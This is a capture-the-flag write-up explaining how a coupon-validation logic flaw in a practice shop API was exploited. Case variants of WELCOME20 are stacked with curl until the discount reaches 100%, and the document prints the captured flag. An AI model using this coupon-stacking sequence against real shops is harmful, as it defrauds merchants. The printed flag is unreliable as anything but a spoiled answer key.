# Coupon Collector

## Metadata

| Field | Value |
| --- | --- |
| Category | `api` |
| Difficulty | Easy |
| Points | 100 |
| Solves | 193 |
| First Blood | jbr3abyt3 |

## Challenge Description

```text
ShopEZ is having a sale: WELCOME20 takes 20% off. Generous.
```

## Artifacts

This challenge did not provide a source archive in this directory. The available
artifacts came from live API testing:

```text
solve_coupon.sh
coupon.cookies
coupon-solve.cookies
```

`solve_coupon.sh` is the final exploitation artifact. The cookie files are
captured curl cookie jars from the manual exploration phase.

The target used during the solve was:

```text
https://a0fa8a95c8c592ce.chal.ctf.ae
```

## Recon

I started with the description instead of assuming a bug. The important clue was
not just the coupon value; it was that the challenge explicitly named one coupon,
`WELCOME20`, and the short notes in the challenge page described a JSON REST API
with cookie sessions.

The initial route map was:

```text
GET  /api/products
POST /api/cart
POST /api/apply-coupon
POST /api/checkout
```

My first goal was to understand the normal purchase flow before trying coupon
edge cases.

### Product Listing

I queried the product list:

```bash
curl -X GET https://a0fa8a95c8c592ce.chal.ctf.ae/api/products
```

Representative response:

```json
{
  "products": [
    {"id": 1, "name": "Wireless Headphones", "price": 59.99},
    {"id": 2, "name": "USB-C Hub", "price": 34.99},
    {"id": 3, "name": "Mechanical Keyboard", "price": 89.99},
    {"id": 4, "name": "Laptop Stand", "price": 29.99},
    {"id": 5, "name": "Webcam HD", "price": 44.99}
  ]
}
```

The products all cost more than zero, so the checkout probably needed a discount
bypass rather than a free item.

### Cart Behavior

Before knowing the expected body format, I sent an empty cart request:

```bash
curl -X POST https://a0fa8a95c8c592ce.chal.ctf.ae/api/cart
```

The API answered:

```json
{"error":"Missing product_id"}
```

That gave the first concrete input name. I then added the keyboard:

```bash
curl -X POST https://a0fa8a95c8c592ce.chal.ctf.ae/api/cart \
  -H 'Content-Type: application/json' \
  -d '{"product_id":3}'
```

Response:

```json
{"cart_size":1,"message":"Added Mechanical Keyboard to cart"}
```

At this stage the API looked stateful, so I repeated the request with a curl
cookie jar:

```bash
curl -c coupon.cookies -b coupon.cookies \
  -X POST https://a0fa8a95c8c592ce.chal.ctf.ae/api/cart \
  -H 'Content-Type: application/json' \
  -d '{"product_id":3}'
```

The cookie had the shape of a signed Flask session: a readable base64 JSON
payload followed by a timestamp/signature. I decoded only the readable payload,
without modifying or forging the signature:

```json
{
  "applied_coupons": [],
  "cart": [
    {
      "id": 3,
      "name": "Mechanical Keyboard",
      "price": 89.99
    }
  ],
  "discount": 0
}
```

That told me two useful things:

- coupon state was stored per session;
- the server was tracking an `applied_coupons` list and a numeric `discount`.

This did not mean the cookie was forgeable. It only gave visibility into the
server's state model and suggested where to look for business logic mistakes.

### Coupon Checks

Next I applied the advertised coupon:

```bash
curl -c coupon.cookies -b coupon.cookies \
  -X POST https://a0fa8a95c8c592ce.chal.ctf.ae/api/apply-coupon \
  -H 'Content-Type: application/json' \
  -d '{"coupon":"WELCOME20"}'
```

Response:

```json
{"discount_percent":20.0,"message":"Coupon 'WELCOME20' applied!","total":71.99}
```

Reapplying the exact same string failed:

```json
{"error":"Coupon already applied"}
```

I also tried direct stronger names like `WELCOME100`, but they were rejected.
That ruled out the simplest "guess a better coupon" idea. The interesting
question became: does the duplicate check compare the coupon exactly as entered,
while the validity check normalizes it?

## Vulnerability

The vulnerability is a business-logic flaw in coupon normalization.

From the responses and decoded session state, the server appeared to have two
separate pieces of logic:

1. A validity check that accepted `WELCOME20` case-insensitively.
2. A duplicate-use check that stored and compared the raw submitted coupon
   string.

That hypothesis came from testing a case variation:

```bash
curl -c coupon.cookies -b coupon.cookies \
  -X POST https://a0fa8a95c8c592ce.chal.ctf.ae/api/apply-coupon \
  -H 'Content-Type: application/json' \
  -d '{"coupon":"Welcome20"}'
```

Response:

```json
{"discount_percent":40.0,"message":"Coupon 'Welcome20' applied!","total":53.99}
```

The result was the key evidence. The server treated `Welcome20` as the valid
`WELCOME20` coupon, but it did not treat it as already applied after `WELCOME20`.
The decoded cookie after two variants supported the same model:

```json
{
  "applied_coupons": ["WELCOME20", "Welcome20"],
  "cart": [
    {"id": 3, "name": "Mechanical Keyboard", "price": 89.99}
  ],
  "discount": 0.4
}
```

A correct implementation should canonicalize the coupon before both validation
and duplicate tracking. For example, it should store only `WELCOME20` in
`applied_coupons`, regardless of whether the user submitted `WELCOME20`,
`Welcome20`, or `welcome20`.

This matches a common class of business logic bugs: the application accepts
unexpected variants that violate the intended purchase rule. PortSwigger's Web
Security Academy describes these as logic flaws caused by assumptions about how
users will interact with application workflows.

## Exploitation

The full exploit chain is:

1. Start a new cookie-backed session.
2. Add a product to the cart.
3. Apply `WELCOME20`.
4. Apply additional case variants of the same coupon.
5. Stop when the accumulated discount reaches 100%.
6. Submit checkout with a zero total.

I used five variants because each valid application adds 20 percentage points:

```text
5 accepted variants * 20% = 100%
```

Working request sequence:

```bash
cookie=coupon-solve.cookies

curl -c "$cookie" -b "$cookie" \
  -X POST https://a0fa8a95c8c592ce.chal.ctf.ae/api/cart \
  -H 'Content-Type: application/json' \
  -d '{"product_id":3}'

for c in WELCOME20 welcome20 Welcome20 WElcome20 WeLcome20; do
  curl -c "$cookie" -b "$cookie" \
    -X POST https://a0fa8a95c8c592ce.chal.ctf.ae/api/apply-coupon \
    -H 'Content-Type: application/json' \
    -d "{\"coupon\":\"$c\"}"
done

curl -c "$cookie" -b "$cookie" \
  -X POST https://a0fa8a95c8c592ce.chal.ctf.ae/api/checkout \
  -H 'Content-Type: application/json' \
  -d '{}'
```

Checkout response:

```json
{
  "flag": "flag{f5614d580c4519a9}",
  "message": "Order completed!",
  "order_id": "337d19bf",
  "total": 0.0
}
```

## Technical Details

The bug is not cryptographic. The signed session cookie helped with inspection,
but the exploit did not require forging or editing it.

The relevant state was:

```json
{
  "applied_coupons": ["WELCOME20", "Welcome20"],
  "discount": 0.4
}
```

The state shows the mismatch:

- `WELCOME20` and `Welcome20` both map to the same valid promotion.
- The duplicate check still preserves them as different raw strings.
- The discount accumulates as if they were independent coupons.

Mathematically, the keyboard costs `89.99`. The totals observed after accepted
coupon variants were consistent with cumulative 20% steps:

```text
0 coupons: 89.99
1 coupon : 71.99
2 coupons: 53.99
5 coupons: 0.00
```

Once the total reaches zero, `/api/checkout` completes the order and returns the
flag.

## Exploit Artifact

The final artifact is [solve_coupon.sh](solve_coupon.sh). It:

- creates an isolated temporary cookie jar;
- adds product `3` to the cart;
- applies five case variants of `WELCOME20`;
- posts to `/api/checkout`;
- prints the final response.

Usage:

```bash
chmod +x solve_coupon.sh
./solve_coupon.sh https://a0fa8a95c8c592ce.chal.ctf.ae
```

The script uses `curl -k` because the challenge certificate was expired during
later re-checks. This is only a transport workaround and is not part of the
vulnerability.

## Validation

Manual validation during the challenge:

```text
{"discount_percent":20.0,"message":"Coupon 'WELCOME20' applied!","total":71.99}
{"discount_percent":40.0,"message":"Coupon 'Welcome20' applied!","total":53.99}
```

Final checkout:

```json
{"flag":"flag{f5614d580c4519a9}","message":"Order completed!","order_id":"337d19bf","total":0.0}
```

Later re-check note: the original host currently returns `502 Domain not found`,
so the live service appears to have been retired. The write-up preserves the
captured command sequence and API responses from the solve.

## References

- <https://portswigger.net/web-security/logic-flaws/examples>
- <https://flask.palletsprojects.com/en/stable/api/#flask.sessions.SecureCookieSessionInterface>

## Flag

```text
flag{f5614d580c4519a9}
```
